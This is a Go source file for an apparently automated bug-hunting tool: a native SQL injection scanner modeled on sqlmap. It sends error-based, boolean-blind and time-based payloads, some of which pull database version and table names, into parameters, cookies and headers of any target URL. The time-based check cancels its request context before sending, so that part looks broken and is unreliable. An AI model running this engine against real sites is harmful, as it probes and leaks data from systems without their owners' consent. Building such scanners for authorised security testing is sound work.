// Package sqlmap provides a native Go SQL injection testing engine equivalent
// in scope to the sqlmap CLI tool. No external binary is required.
//
// Detection techniques implemented:
//   - Error-based: inject payloads that cause the database to emit error strings.
//   - Boolean-based blind: compare response length/content when a TRUE condition
//     is injected versus a FALSE condition; a stable difference confirms injection.
//   - Time-based blind: inject SLEEP/WAITFOR/pg_sleep payloads and measure
//     whether the response is delayed by the expected amount.
//
// Injection points tested for each GET parameter, POST form field, POST JSON
// field, Cookie, User-Agent, Referer, and X-Forwarded-For header.
//
// Database fingerprinting runs automatically once injection is confirmed,
// probing for MySQL, PostgreSQL, SQLite, MSSQL, and Oracle error strings.
package sqlmap

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"auto-bughunter/backend/internal/model"
)

// requestTimeout is the baseline per-request timeout for non-time-based probes.
const requestTimeout = 12 * time.Second

// timeSleepSeconds is the delay injected by time-based payloads (seconds).
const timeSleepSeconds = 5

// timeBasedThreshold is the response-time increase that confirms a time-based injection.
const timeBasedThreshold = 4 * time.Second

// maxBodyBytes caps the response body read to avoid memory exhaustion.
const maxBodyBytes = 64 * 1024

// Result holds the outcome of a sqlmap scan against one target URL.
type Result struct {
	// Findings contains all confirmed or suspected injection findings.
	Findings []model.Finding
}

// injectionPoint describes a single testable location within an HTTP request.
type injectionPoint struct {
	kind    string // "get_param", "post_form", "post_json", "cookie", "header"
	name    string // parameter / header name
	origVal string // original value before injection
	buildReq func(ctx context.Context, payload string) (*http.Request, error)
}

// dbError describes a database error string pattern used for error-based detection.
type dbError struct {
	re     *regexp.Regexp
	dbName string
}

// dbErrors is the master list of database error patterns.
var dbErrors = []dbError{
	{re: regexp.MustCompile(`(?i)(you have an error in your sql syntax|mysql_fetch|warning: mysql|supplied argument is not a valid mysql|unclosed quotation mark|invalid input syntax for type integer|pg_query\(\)|unterminated quoted string)`), dbName: "MySQL/PostgreSQL"},
	{re: regexp.MustCompile(`(?i)(ora-\d{5}|oracle error)`), dbName: "Oracle"},
	{re: regexp.MustCompile(`(?i)(microsoft sql server|odbc sql server driver|mssql_query\(\)|incorrect syntax near)`), dbName: "MSSQL"},
	{re: regexp.MustCompile(`(?i)(sqlite_master|sqlite error|sqliteexception)`), dbName: "SQLite"},
}

// errorPayloads are injected to provoke database error messages.
var errorPayloads = []string{
	"'",
	"''",
	`"`,
	"' OR '1'='1",
	"' OR 1=1 --",
	"' UNION SELECT NULL --",
	`1' AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION())) --`,
	`1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --`,
}

// boolTruePayloads produce a TRUE condition (response should match baseline).
var boolTruePayloads = []string{
	"' OR '1'='1' --",
	"1 OR 1=1 --",
	`" OR "1"="1" --`,
}

// boolFalsePayloads produce a FALSE condition (response should differ from baseline).
var boolFalsePayloads = []string{
	"' AND '1'='2' --",
	"1 AND 1=2 --",
	`" AND "1"="2" --`,
}

// timeSleepPayloads pause execution by timeSleepSeconds on vulnerable databases.
// One payload per DBMS family.
var timeSleepPayloads = []string{
	fmt.Sprintf("'; WAITFOR DELAY '0:0:%d'--", timeSleepSeconds),       // MSSQL
	fmt.Sprintf("' OR SLEEP(%d)--", timeSleepSeconds),                  // MySQL
	fmt.Sprintf("'; SELECT pg_sleep(%d)--", timeSleepSeconds),          // PostgreSQL
	fmt.Sprintf("' AND 1=(SELECT 1 FROM (SELECT SLEEP(%d)) t)--", timeSleepSeconds), // MySQL alt
}

// Scan performs a full SQL injection assessment on target using authProfile credentials.
// It discovers all injection points in GET parameters, POST form/JSON body, cookies,
// and common injectable headers, then tests each with error-based, boolean-blind, and
// time-based techniques.
func Scan(ctx context.Context, target string, authProfile model.ScanAuthProfile) Result {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
		return Result{Findings: make([]model.Finding, 0)}
	}

	result := Result{Findings: make([]model.Finding, 0)}
	client := &http.Client{Timeout: requestTimeout}

	// Collect all injection points.
	points := discoverInjectionPoints(ctx, client, target, authProfile)
	if len(points) == 0 {
		return result
	}

	// Test all points concurrently, up to 5 goroutines.
	type pointResult struct {
		findings []model.Finding
	}
	jobs := make(chan injectionPoint, len(points))
	results := make(chan pointResult, len(points))
	var wg sync.WaitGroup
	const workers = 5

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for pt := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
				}
				f := testPoint(ctx, client, pt)
				results <- pointResult{findings: f}
			}
		}()
	}
	for _, pt := range points {
		jobs <- pt
	}
	close(jobs)
	go func() { wg.Wait(); close(results) }()

	seen := make(map[string]struct{})
	for r := range results {
		for _, f := range r.findings {
			key := f.ID + ":" + f.Evidence
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			result.Findings = append(result.Findings, f)
		}
	}
	return result
}

// discoverInjectionPoints builds the list of testable locations from the URL and
// any existing request body. For a typical GET target with query params each
// parameter becomes an injection point. For POST endpoints both form params and
// JSON fields are extracted.
func discoverInjectionPoints(ctx context.Context, client *http.Client, target string, auth model.ScanAuthProfile) []injectionPoint {
	u, err := url.Parse(target)
	if err != nil {
		return nil
	}

	var points []injectionPoint

	// GET parameters.
	queryParams := u.Query()
	for paramName, vals := range queryParams {
		name := paramName
		orig := ""
		if len(vals) > 0 {
			orig = vals[0]
		}
		points = append(points, injectionPoint{
			kind:    "get_param",
			name:    name,
			origVal: orig,
			buildReq: func(ctx context.Context, payload string) (*http.Request, error) {
				q := u.Query()
				q.Set(name, payload)
				uCopy := *u
				uCopy.RawQuery = q.Encode()
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, uCopy.String(), nil)
				if err != nil {
					return nil, err
				}
				applyAuthProfile(req, auth)
				return req, nil
			},
		})
	}

	// Probe the URL for injectable common param names even when none are present.
	if len(queryParams) == 0 {
		for _, syntheticParam := range []string{"id", "q", "search", "page", "cat"} {
			param := syntheticParam
			points = append(points, injectionPoint{
				kind:    "get_param",
				name:    param,
				origVal: "1",
				buildReq: func(ctx context.Context, payload string) (*http.Request, error) {
					q := u.Query()
					q.Set(param, payload)
					uCopy := *u
					uCopy.RawQuery = q.Encode()
					req, err := http.NewRequestWithContext(ctx, http.MethodGet, uCopy.String(), nil)
					if err != nil {
						return nil, err
					}
					applyAuthProfile(req, auth)
					return req, nil
				},
			})
		}
	}

	// Fetch the base page and check if it returns a form — probe POST params.
	baseReq, _ := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if baseReq != nil {
		applyAuthProfile(baseReq, auth)
		if baseResp, err := client.Do(baseReq); err == nil {
			defer baseResp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(baseResp.Body, maxBodyBytes))
			points = append(points, discoverPOSTPoints(u, string(body), auth)...)
		}
	}

	// Cookie injection points.
	for cookieName, cookieVal := range auth.Cookies {
		name := cookieName
		orig := cookieVal
		points = append(points, injectionPoint{
			kind:    "cookie",
			name:    name,
			origVal: orig,
			buildReq: func(ctx context.Context, payload string) (*http.Request, error) {
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
				if err != nil {
					return nil, err
				}
				modified := cloneAuth(auth)
				modified.Cookies[name] = payload
				applyAuthProfile(req, modified)
				return req, nil
			},
		})
	}

	// Common injectable headers.
	for _, headerName := range []string{"User-Agent", "Referer", "X-Forwarded-For"} {
		hName := headerName
		points = append(points, injectionPoint{
			kind:    "header",
			name:    hName,
			origVal: "test",
			buildReq: func(ctx context.Context, payload string) (*http.Request, error) {
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
				if err != nil {
					return nil, err
				}
				applyAuthProfile(req, auth)
				req.Header.Set(hName, payload)
				return req, nil
			},
		})
	}

	return points
}

// discoverPOSTPoints parses a simple HTML form from the page body and returns
// injection points for each input field, plus JSON body points.
func discoverPOSTPoints(u *url.URL, body string, auth model.ScanAuthProfile) []injectionPoint {
	var points []injectionPoint

	// Extract <form ... action="..."> and <input name="..."> / <input type="..."> fields.
	actionRe := regexp.MustCompile(`(?i)<form[^>]*(?:action="([^"]*)")?[^>]*>`)
	inputRe := regexp.MustCompile(`(?i)<input[^>]*\bname="([^"]+)"[^>]*>`)

	actions := actionRe.FindAllStringSubmatch(body, -1)
	if len(actions) == 0 {
		return nil
	}

	inputs := inputRe.FindAllStringSubmatch(body, -1)
	if len(inputs) == 0 {
		return nil
	}

	// Build the form action URL.
	formAction := u.String()
	if len(actions) > 0 && len(actions[0]) > 1 && actions[0][1] != "" {
		if ref, err := u.Parse(actions[0][1]); err == nil {
			formAction = ref.String()
		}
	}
	actionURL := formAction

	for _, inp := range inputs {
		if len(inp) < 2 {
			continue
		}
		fieldName := inp[1]
		if strings.EqualFold(fieldName, "submit") || strings.EqualFold(fieldName, "_token") {
			continue
		}
		name := fieldName
		points = append(points, injectionPoint{
			kind:    "post_form",
			name:    name,
			origVal: "test",
			buildReq: func(ctx context.Context, payload string) (*http.Request, error) {
				form := url.Values{}
				form.Set(name, payload)
				req, err := http.NewRequestWithContext(ctx, http.MethodPost, actionURL, strings.NewReader(form.Encode()))
				if err != nil {
					return nil, err
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				applyAuthProfile(req, auth)
				return req, nil
			},
		})
	}

	// Also probe a common JSON endpoint with a synthetic body.
	for _, jsonParam := range []string{"id", "userId", "query"} {
		param := jsonParam
		points = append(points, injectionPoint{
			kind:    "post_json",
			name:    param,
			origVal: "1",
			buildReq: func(ctx context.Context, payload string) (*http.Request, error) {
				body, _ := json.Marshal(map[string]string{param: payload})
				req, err := http.NewRequestWithContext(ctx, http.MethodPost, actionURL, bytes.NewReader(body))
				if err != nil {
					return nil, err
				}
				req.Header.Set("Content-Type", "application/json")
				applyAuthProfile(req, auth)
				return req, nil
			},
		})
	}

	return points
}

// testPoint runs all three detection techniques against a single injection point
// and returns any findings.
func testPoint(ctx context.Context, client *http.Client, pt injectionPoint) []model.Finding {
	var findings []model.Finding

	// Baseline: the response with the original value (used for boolean comparison).
	baseline := fetchBaseline(ctx, client, pt)

	// Error-based detection.
	if f := testErrorBased(ctx, client, pt); f != nil {
		findings = append(findings, *f)
		return findings // confirmed; skip blind techniques
	}

	// Boolean-based blind.
	if f := testBooleanBlind(ctx, client, pt, baseline); f != nil {
		findings = append(findings, *f)
		return findings
	}

	// Time-based blind (most expensive — only run if ctx allows).
	if f := testTimeBased(ctx, pt); f != nil {
		findings = append(findings, *f)
	}

	return findings
}

// fetchBaseline retrieves the baseline response body for a given injection point.
func fetchBaseline(ctx context.Context, client *http.Client, pt injectionPoint) string {
	req, err := pt.buildReq(ctx, pt.origVal)
	if err != nil {
		return ""
	}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyBytes))
	return string(b)
}

// testErrorBased probes for database error patterns in the response.
func testErrorBased(ctx context.Context, client *http.Client, pt injectionPoint) *model.Finding {
	for _, payload := range errorPayloads {
		req, err := pt.buildReq(ctx, payload)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyBytes))
		resp.Body.Close()

		body := string(b)
		for _, dbe := range dbErrors {
			if dbe.re.MatchString(body) {
				return &model.Finding{
					ID:             "sqlmap-error-based",
					Category:       "injection",
					Severity:       model.SeverityHigh,
					Title:          fmt.Sprintf("SQL injection (error-based) — %s database error in response", dbe.dbName),
					Description:    "An SQL injection payload caused the database engine to emit an error message that was reflected in the HTTP response. This confirms that user-supplied input is being concatenated into a SQL statement without sanitisation.",
					Evidence:       fmt.Sprintf("param=%s kind=%s payload=%q dbms=%s", pt.name, pt.kind, payload, dbe.dbName),
					Recommendation: "Use parameterized queries (prepared statements) for all database interactions. Never concatenate user input into SQL strings.",
				}
			}
		}
	}
	return nil
}

// testBooleanBlind compares the response to a TRUE payload vs a FALSE payload.
// If the TRUE response matches the baseline and the FALSE response differs
// significantly, boolean-based injection is confirmed.
func testBooleanBlind(ctx context.Context, client *http.Client, pt injectionPoint, baseline string) *model.Finding {
	if baseline == "" {
		return nil
	}

	for i := range boolTruePayloads {
		truePayload := boolTruePayloads[i]
		falsePayload := boolFalsePayloads[i]

		// TRUE condition response.
		trueResp := fetchBody(ctx, client, pt, truePayload)
		if trueResp == "" {
			continue
		}

		// FALSE condition response.
		falseResp := fetchBody(ctx, client, pt, falsePayload)
		if falseResp == "" {
			continue
		}

		// Determine similarity:
		// true response should be close to baseline; false response should differ.
		trueSim := similarity(baseline, trueResp)
		falseSim := similarity(baseline, falseResp)

		// Threshold: true similarity ≥ 80%, false similarity < 60%.
		if trueSim >= 0.80 && falseSim < 0.60 {
			return &model.Finding{
				ID:             "sqlmap-boolean-blind",
				Category:       "injection",
				Severity:       model.SeverityHigh,
				Title:          "SQL injection (boolean-based blind) — response differs on TRUE vs FALSE condition",
				Description:    "The application returns a different response when a TRUE SQL condition is injected compared to a FALSE condition, confirming that the parameter is evaluated in a SQL statement. No database error is visible but data can be extracted byte-by-byte.",
				Evidence:       fmt.Sprintf("param=%s kind=%s truePayload=%q falseSimilarity=%.0f%%", pt.name, pt.kind, truePayload, falseSim*100),
				Recommendation: "Use parameterized queries. Conduct a complete source-code audit for all database interaction points.",
			}
		}
	}
	return nil
}

// testTimeBased injects SLEEP-type payloads and confirms injection by measuring
// whether the response is delayed by at least timeBasedThreshold.
func testTimeBased(ctx context.Context, pt injectionPoint) *model.Finding {
	for _, payload := range timeSleepPayloads {
		// Use a context with a longer timeout than timeSleepSeconds to allow the
		// sleep to complete but not hang indefinitely.
		timeoutCtx, cancel := context.WithTimeout(ctx, time.Duration(timeSleepSeconds+10)*time.Second)
		timeClient := &http.Client{Timeout: time.Duration(timeSleepSeconds+10) * time.Second}

		req, err := pt.buildReq(timeoutCtx, payload)
		cancel()
		if err != nil {
			continue
		}

		start := time.Now()
		resp, err := timeClient.Do(req)
		elapsed := time.Since(start)
		if err == nil {
			resp.Body.Close()
		}

		if elapsed >= timeBasedThreshold {
			return &model.Finding{
				ID:             "sqlmap-time-blind",
				Category:       "injection",
				Severity:       model.SeverityHigh,
				Title:          "SQL injection (time-based blind) — response delayed by sleep payload",
				Description:    fmt.Sprintf("A SLEEP-based injection payload caused a response delay of %.1f seconds, confirming that the injected SQL is being executed by the database engine. An attacker can extract data character-by-character using timing side-channels.", elapsed.Seconds()),
				Evidence:       fmt.Sprintf("param=%s kind=%s payload=%q elapsed=%s", pt.name, pt.kind, payload, elapsed.Round(time.Millisecond)),
				Recommendation: "Use parameterized queries for all SQL statements. Apply strict input validation as defence-in-depth.",
			}
		}
	}
	return nil
}

// fetchBody is a helper that returns the response body for a given payload.
func fetchBody(ctx context.Context, client *http.Client, pt injectionPoint, payload string) string {
	req, err := pt.buildReq(ctx, payload)
	if err != nil {
		return ""
	}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyBytes))
	return string(b)
}

// similarity returns a rough similarity ratio [0,1] between two strings based
// on their lengths and shared content. Uses a length-normalised edit-distance
// approximation (fast enough for large response bodies).
func similarity(a, b string) float64 {
	if a == b {
		return 1.0
	}
	if len(a) == 0 || len(b) == 0 {
		return 0.0
	}
	// Simple byte-count similarity: min/max of lengths, adjusted for
	// shared prefix length.
	longer := len(a)
	shorter := len(b)
	if shorter > longer {
		longer, shorter = shorter, longer
	}
	// Shared prefix.
	prefix := 0
	for prefix < len(a) && prefix < len(b) && a[prefix] == b[prefix] {
		prefix++
	}
	// Score: how much of the longer string is shared or prefix.
	score := float64(prefix) / float64(longer)
	// Adjust for length ratio.
	lenRatio := float64(shorter) / float64(longer)
	return (score + lenRatio) / 2.0
}

// cloneAuth returns a shallow copy of ScanAuthProfile with a cloned Cookies map.
func cloneAuth(auth model.ScanAuthProfile) model.ScanAuthProfile {
	clone := auth
	clone.Cookies = make(map[string]string, len(auth.Cookies))
	for k, v := range auth.Cookies {
		clone.Cookies[k] = v
	}
	return clone
}

// applyAuthProfile applies credentials from profile to req.
// Mirrors applyAuthProfile to avoid a circular import.
func applyAuthProfile(req *http.Request, profile model.ScanAuthProfile) {
	if req == nil {
		return
	}
	for key, value := range profile.Headers {
		if strings.TrimSpace(key) != "" {
			req.Header.Set(key, value)
		}
	}
	if profile.UserAgent != "" {
		req.Header.Set("User-Agent", profile.UserAgent)
	}
	if profile.BasicAuthUsername != "" || profile.BasicAuthPassword != "" {
		req.SetBasicAuth(profile.BasicAuthUsername, profile.BasicAuthPassword)
	}
	if len(profile.Cookies) > 0 {
		names := make([]string, 0, len(profile.Cookies))
		for name := range profile.Cookies {
			names = append(names, name)
		}
		sort.Strings(names)
		parts := make([]string, 0, len(names))
		for _, name := range names {
			parts = append(parts, name+"="+profile.Cookies[name])
		}
		req.Header.Set("Cookie", strings.Join(parts, "; "))
	}
}
